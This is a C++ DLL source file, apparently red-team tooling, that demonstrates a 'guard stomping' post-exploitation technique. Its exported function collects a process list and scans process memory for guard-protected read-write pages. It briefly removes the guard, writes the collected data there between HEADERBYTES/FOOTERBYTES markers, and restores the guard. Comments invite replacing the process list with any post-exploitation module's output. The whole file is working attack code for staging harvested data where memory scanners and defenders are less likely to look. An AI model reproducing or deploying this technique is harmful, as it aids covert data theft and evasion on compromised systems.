// dllmain.cpp : Defines the entry point for the DLL application.
//not using pre-compiled headers
/*THISE CODE DEMOES GUARD STOMPING TECHNIQUE*/
/*WRITTEN BY ASAURUSREX*/


#include <windows.h>
#include "ProcessListing.h" //replace this custom code which your desired post-exploitation module which returns data
#include <iostream> 
#include <string>



using namespace std;

//#include <tlhelp32.h> -> don't think this is needed anymore but leaving just in case
#include <stdio.h>
/* only needed if you are going to use Nt functions (not fetching them in any special way)
#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE               ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PULONG           NumberOfBytesToProtect,
    IN ULONG                NewAccessProtection,
    OUT PULONG              OldAccessProtection
);
*/
//also causes strange sizing changes to guard page regions, just like VirtualProtect

extern "C"  __declspec(dllexport) void CALLBACK ExportedFunction()
{

    std::wstring process_list = GetProcessList();
    
    int byte_offset = 0;
    SIZE_T bytes_written = 0;
    MEMORY_BASIC_INFORMATION mbi;
    ZeroMemory(&mbi, sizeof(mbi));

    for (PBYTE baseAddress = nullptr;
        VirtualQuery(baseAddress, &mbi, sizeof(mbi));
        baseAddress += mbi.RegionSize)
    {
        // Check if the region is committed and has PAGE_GUARD + PAGE_READWRITE protection
        if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_GUARD) && (mbi.Protect & PAGE_READWRITE))
        {
            if (byte_offset < (process_list.size()*2)) //*2 because wchars
            {
                DWORD oldprotect = 0;
                LPVOID testaddress = (LPVOID)mbi.BaseAddress;
                ULONG protectSize = mbi.RegionSize;
                //use size of the region to know how many bytes we can write
                VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_READWRITE, &oldprotect); //causes weird size changes, but returns to normal. not sure why. Can try NtProtectVirtualMemory but same issue.
                //NTSTATUS status = NtProtectVirtualMemory(GetCurrentProcess(), &testaddress, &protectSize, PAGE_READWRITE, &oldprotect);


                //write as many bytes as you can here
                std::wstring message = L"";
                //convoluted but based on wchars essentially need two bytes per byte because extra 0x00 padding between bytes
                if ((mbi.RegionSize) < (process_list.size()*2 - byte_offset + 12*4)) //if region size less than remaining process_list size, use the entire region to write to
                {
                    //change process_list data to your custom post exploitation module data
                    message = L"HEADERBYTES" + process_list.substr(byte_offset/2, (mbi.RegionSize) / 2 - 12 * 4) + L"FOOTERBYTES"; //get substr to match size
                    
                    WriteProcessMemory(GetCurrentProcess(), mbi.BaseAddress, message.data(), message.size() * 2, &bytes_written);
                    
                    //for debugging
                    // std::wstring bytes_w = to_wstring(bytes_written);
                    // MessageBoxW(NULL, bytes_w.data(), L"Bytes Written", MB_OK);

                    byte_offset += bytes_written - 12 * 4; //remove header and footer from calculation

                    //for more debugging, see how large the region is now that we've changed permissions and written to it.
                    // MEMORY_BASIC_INFORMATION mbi2;
                    // VirtualQuery(mbi.BaseAddress, &mbi2, sizeof(mbi2));
                    // wprintf(L"\nSize of region once written is: %d\n", mbi2.RegionSize);
                    

                    //change back to old permissions, should fix sizing issues
                    VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_READWRITE | PAGE_GUARD, &oldprotect);
                }
                else //if region size is larger, write the remaining amuount of bytes
                {
                    //change process_list data to your custom post exploitation module data
                    message = L"HEADERBYTES" + process_list.substr(byte_offset/2, process_list.size()) + L"FOOTERBYTES"; //get remainder of the string

                    //for debugging
                    //std::wstring message_size = to_wstring(message.size());
                    //MessageBoxW(NULL, message_size.data(), L"Message Size", MB_OK);
                    //std::wstring message = L"HEADERBYTES" + process_list + L"FOOTERBYTES";


                    WriteProcessMemory(GetCurrentProcess(), mbi.BaseAddress, message.data(), message.size() * 2, &bytes_written);
                    std::wstring bytes_w = to_wstring(bytes_written);
                    MessageBoxW(NULL, bytes_w.data(), L"Bytes Written", MB_OK);
                    byte_offset += bytes_written - 12 * 4; //remove header and footer from calculation

                    //for more debugging, see how large the region is now that we've changed permissions and written to it.
                    // MEMORY_BASIC_INFORMATION mbi2;
                    // VirtualQuery(mbi.BaseAddress, &mbi2, sizeof(mbi2));
                    // wprintf(L"\nSize of region once written is: %d\n", mbi2.RegionSize);


                    //change back to old permissions, should fix sizing issues
                    VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_READWRITE | PAGE_GUARD, &oldprotect);
                    break;
                }
                

                
            }
        
            

        }
    }
    
    return;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

